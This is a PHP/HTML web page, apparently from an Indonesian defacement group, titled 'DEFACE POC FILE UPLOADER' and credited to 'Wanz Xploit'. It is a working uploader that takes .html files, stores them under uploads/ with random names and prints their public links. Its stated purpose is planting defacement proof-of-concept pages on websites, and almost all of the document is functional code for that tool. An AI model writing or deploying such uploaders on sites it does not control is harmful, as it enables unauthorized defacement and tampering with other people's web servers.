<!DOCTYPE html>
<html>
<head>
    <title>Upload HTML File</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #222;
            color: #fff;
            font-family: Arial, sans-serif;
            font-size: 16px;
            line-height: 1.5;
            padding: 20px;
        }

        h1 {
            font-size: 24px;
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="file"] {
            margin-bottom: 20px;
        }

        button {
            background-color: #333;
            border: none;
            color: #fff;
            cursor: pointer;
            font-size: 18px;
            padding: 10px 20px;
            margin-bottom: 20px;
        }

        button:hover {
            background-color: #555;
        }

        .upload-result {
            margin-top: 20px;
            font-size: 18px;
            overflow-wrap: break-word;
        }

        @media (max-width: 767px) {
            body {
                font-size: 14px;
            }

            h1 {
                font-size: 20px;
            }
        }

        .dark-mode {
            background-color: #333;
            color: #fff;
        }

        .dark-mode button {
            background-color: #555;
        }
    </style>
    <style>
        body {
            background-color: #000;
        }
        h2 {
            color: #fff;
            font-size: 1,9rem;
            font-family: 'Arial', sans-serif;
            animation: du 2s ease-in-out infinite;
        }
        .upload-result {
            font-size: 20px;
        }
        @keyframes du {
            from {
                text-shadow: -0.05em -0.05em 0 #222, 0.05em 0.05em 0 #888;
            }
            to {
                text-shadow: -0.1em -0.1em 0 #222, 0.1em 0.1em 0 #888;
            }
        }
    </style>
</head>
<body>
    <h2>DEFACE POC FILE UPLOADER</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="html_file">
        <button type="submit" name="upload">Upload</button>
    </form>

    <?php
    if (isset($_POST["upload"])) {
        $allowed_extensions = array("html");
        $uploaded_file = $_FILES["html_file"]["name"];
        $file_extension = pathinfo($uploaded_file, PATHINFO_EXTENSION);

        if (!in_array($file_extension, $allowed_extensions)) {
            echo "<p class='upload-result'>File type not allowed. Please upload an HTML file.</p>";
        } else {
            $upload_folder = "uploads/";
            $upload_path = $upload_folder . uniqid() . ".html";
            move_uploaded_file($_FILES["html_file"]["tmp_name"], $upload_path);
            echo "<p class='upload-result' style='font-size:1px;'>File uploaded successfully. Link to uploaded file: <br> http://" . $_SERVER['HTTP_HOST'] . "/" . $upload_path . "</p>";
            echo "<button onclick='copyLink()'>Salin Link</button>";
		}
	}
	?>

	<script>
		function copyLink() {
			var link = document.querySelector('.upload-result').innerText.split('http://')[1];
			var textArea = document.createElement("textarea");
			textArea.value = "http://" + link;
			document.body.appendChild(textArea);
			textArea.select();
			document.execCommand("Copy");
			textArea.remove();
			alert("Link berhasil disalin!");
		}
	</script>
	<footer style="text-align:center; margin-top: 50px;">
		<p style="color: #888888;">&copy; 2023 - Alat Uploader HTML by Wanz Xploit</p>
	</footer>
</body>
</html>
